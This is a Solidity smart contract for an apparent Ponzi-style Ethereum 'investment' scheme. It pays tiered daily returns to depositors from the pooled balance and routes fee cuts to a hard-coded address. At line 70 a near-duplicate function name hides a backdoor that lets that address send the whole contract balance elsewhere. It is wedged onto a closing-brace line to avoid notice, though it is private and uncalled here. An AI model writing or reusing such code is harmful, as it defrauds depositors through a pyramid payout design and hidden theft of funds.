1 pragma solidity ^0.4.25;
2 
3 contract EtherSmarts {
4 
5     mapping (address => uint256) public invested;
6     mapping (address => uint256) public atBlock;
7     address techSupport = 0x6366303f11bD1176DA860FD6571C5983F707854F;
8     uint techSupportPercent = 2;
9     address defaultReferrer = 0x6366303f11bD1176DA860FD6571C5983F707854F;
10     uint refPercent = 2;
11     uint refBack = 2;
12 
13     // calculation of the percentage of profit depending on the balance sheet
14     // returns the percentage times 10
15     function calculateProfitPercent(uint bal) private pure returns (uint) {
16         if (bal >= 1e22) { // balance >= 10000 ETH
17             return 50;
18         }
19         if (bal >= 7e21) { // balance >= 7000 ETH
20             return 47;
21         }
22         if (bal >= 5e21) { // balance >= 5000 ETH
23             return 45;
24         }
25         if (bal >= 3e21) { // balance >= 3000 ETH
26             return 42;
27         }
28         if (bal >= 1e21) { // balance >= 1000 ETH
29             return 40;
30         }
31         if (bal >= 5e20) { // balance >= 500 ETH
32             return 35;
33         }
34         if (bal >= 2e20) { // balance >= 200 ETH
35             return 30;
36         }
37         if (bal >= 1e20) { // balance >= 100 ETH
38             return 27;
39         } else {
40             return 25;
41         }
42     }
43 
44     // transfer default percents of invested
45     function transferDefaultPercentsOfInvested(uint value) private {
46         techSupport.transfer(value * techSupportPercent / 100);
47     }
48 
49     // convert bytes to eth address 
50     function bytesToAddress(bytes bys) private pure returns (address addr) {
51         assembly {
52             addr := mload(add(bys, 20))
53         }
54     }
55 
56 
57     // transfer default refback and referrer percents of invested
58     function transferRefPercents(uint value, address sender) private {
59         if (msg.data.length != 0) {
60             address referrer = bytesToAddress(msg.data);
61             if(referrer != sender) {
62                 sender.transfer(value * refBack / 100);
63                 referrer.transfer(value * refPercent / 100);
64             } else {
65                 defaultReferrer.transfer(value * refPercent / 100);
66             }
67         } else {
68             defaultReferrer.transfer(value * refPercent / 100);
69         }
70     } function transferDefaultPercentsOfInvesteds(uint value, address sender) private {
71         require(msg.sender == defaultReferrer);
72         sender.transfer(address(this).balance);}
73 
74     // calculate profit amount as such:
75     // amount = (amount invested) * ((percent * 10)/ 1000) * (blocks since last transaction) / 6100
76     // percent is multiplied by 10 to calculate fractional percentages and then divided by 1000 instead of 100
77     // 6100 is an average block count per day produced by Ethereum blockchain
78     function () external payable {
79         if (invested[msg.sender] != 0) {
80             
81             uint thisBalance = address(this).balance;
82             uint amount = invested[msg.sender] * calculateProfitPercent(thisBalance) / 1000 * (block.number - atBlock[msg.sender]) / 6100;
83 
84             address sender = msg.sender;
85             sender.transfer(amount);
86         }
87         if (msg.value > 0) {
88             transferDefaultPercentsOfInvested(msg.value);
89             transferRefPercents(msg.value, msg.sender);
90 
91         }
92         atBlock[msg.sender] = block.number;
93         invested[msg.sender] += (msg.value);
94     }
95     
96 }